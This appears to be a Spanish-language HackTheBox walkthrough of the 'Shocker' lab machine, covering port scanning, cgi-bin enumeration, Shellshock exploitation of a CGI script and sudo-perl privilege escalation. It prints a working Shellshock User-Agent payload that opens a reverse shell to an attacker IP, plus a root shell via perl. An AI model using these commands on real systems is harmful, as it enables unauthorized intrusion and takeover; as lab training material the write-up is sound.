+++
title = "HackTheBox - Shocker"
draft = false
description = "Resolución de la máquina Shocker"
tags = ["HTB", "Linux", "Easy", "Perl", "CVE", "Shellshock", "CGI"]
summary = "OS: Linux | Dificultad: Easy | Conceptos: Perl, CVE Público, Shellshock, CGI"
categories = ["Writeups"]
showToc = true
showRelated = true
date = "2025-12-28T00:00:00"
+++

* Dificultad: `easy`
* Tiempo aprox. `~3h`
* **Datos Iniciales**: `10.10.10.56`

## Escaneo Inicial
```bash
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
#Nada en UDP
```

De aquí vemos abiertos dos puertos:
- `80/TCP`: HTTP, el potencial vector de entrada.
- `2222/TCP`: SSH, podemos mirar la versión para ver si hay vulnerabilidades.

## SSH
Respecto a la versión de SSH (OpenSSH 7.2p2), encontramos una vulnerabilidad que permite enumerar usuarios del sistema ([CVE-2016-6210](https://www.exploit-db.com/exploits/40136)), aunque finalmente resulta no funcionar, por lo que nos centramos en el puerto 80.

## HTTP
Al entrar a la página, encontramos una imagen al lado de un texto "Don't Bug Me!", pero nada relevante ni en la imagen ni en el código fuente. Hacemos fuerza bruta para encontrar algo:

```bash
ffuf -u http://10.10.10.56/FUZZ/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic   

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.56/FUZZ/
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
________________________________________________

cgi-bin                 [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 45ms]

```

Al ejecutar ffuf, encontramos el directorio `cgi-bin`, que según Google corresponde al estándar **Common Gateway Interface**, usado para que el servidor ejecute scripts usando como parámetros datos contenidos en la solicitud HTTP.

![](https://phoenixnap.com/kb/wp-content/uploads/2025/08/cgi-bin-diagram.png)

Ahora sabemos que el directorio contendrá scripts en algún lenguaje, así que buscamos alguno:

```bash
ffuf -u http://10.10.10.56/cgi-bin/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -e .pl,.sh,.py,.cgi,.ts,.rb,.js -fc 403 -x http://127.0.0.1:8080

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.56/cgi-bin/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Extensions       : .pl .sh .py .cgi .ts .rb .js 
 :: Filter           : Response status: 403
________________________________________________

user.sh                 [Status: 200, Size: 118, Words: 19, Lines: 8, Duration: 104ms]
:: Progress: [38000/38000] :: Job [1/1] :: 751 req/sec :: Duration: [0:00:51] :: Errors: 0 ::
```

Encontramos un script `user.sh`. Si lo ejecutamos:
```bash
curl http://10.10.10.56:80/cgi-bin/user.sh
Content-Type: text/plain

Just an uptime test script

 20:55:58 up  5:56,  0 users,  load average: 0.00, 0.02, 0.00
```

Tras un rato buscando qué puede hacerse con el script, descubro que un archivo `.sh` (ejecutado potencialmente con Bash) dentro de `cgi-bin` (con parámetros pasados al script a través de las cabeceras HTTP) hacen a la máquina vulnerable a ***Shellshock*** (Vulnerabilidad de la que viene el propio nombre de la máquina).

### Shellshock
Según [InfosecWriteups](https://infosecwriteups.com/shellshock-a-deep-dive-into-cve-2014-6271-3eb5b33e5de6), Shellshock es una vulnerabilidad de Bash que permite que los atacantes ejecuten código a través de las cabeceras HTTP por una forma errónea de parsearlas.

Los scripts CGI dependen de las cabeceras HTTP para tomar parámetros. Cuando Apache pasa el request a Bash, este toma las cabeceras y las guarda en variables de entorno por si el script las necesita usar.

El problema del que viene la vulnerabilidad es un mal parseo de headers por parte de Bash, que permite que, además de guardar parte de un header en una variable de entorno, se ejecute un segundo comando.

Esto se hace definiendo una función en Bash mientras se guarda como variable de entorno, lo que hace que el shell no deje de parsear y ejecute lo que venga después:

```bash
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.10/4321 0>&1' http://shocker.htb/cgi-bin/user.sh
```

Mientras ejecutamos esto, tenemos un handler (p.ej [Penelope](https://github.com/brightio/penelope)) en escucha:
```bash
penelope.py -i tun0 -p 4321
[+] Listening for reverse shells on 10.10.14.10:4321 
➤ Main Menu (m) Payloads (p) Clear (Ctrl-L) Quit (q/Ctrl-C)
[+] Got reverse shell from Shocker~10.10.10.56-Linux-x86_64 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3!
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
-----
shelly@Shocker:/usr/lib/cgi-bin$ 
```

Y tenemos un shell.

## Escalada de privilegios
Veo que `shelly` puede ejecutar `/usr/bin/perl` como root sin necesidad de contraseña.
```bash
shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

Pruebo a iniciar un shell desde `perl`:
```bash
shelly@Shocker:/usr/lib/cgi-bin$ sudo /usr/bin/perl
exec '/bin/bash', '-i';
#Sin output, no funciona.
```

No funciona, pero pruebo a crear un script que haga lo mismo:
```bash
shelly@Shocker:/tmp$ echo 'exec "/bin/bash", "-i";' > shell.pl
shelly@Shocker:/tmp$ sudo /usr/bin/perl shell.pl
root@Shocker:/tmp# whoami
root
```

Y tenemos root.
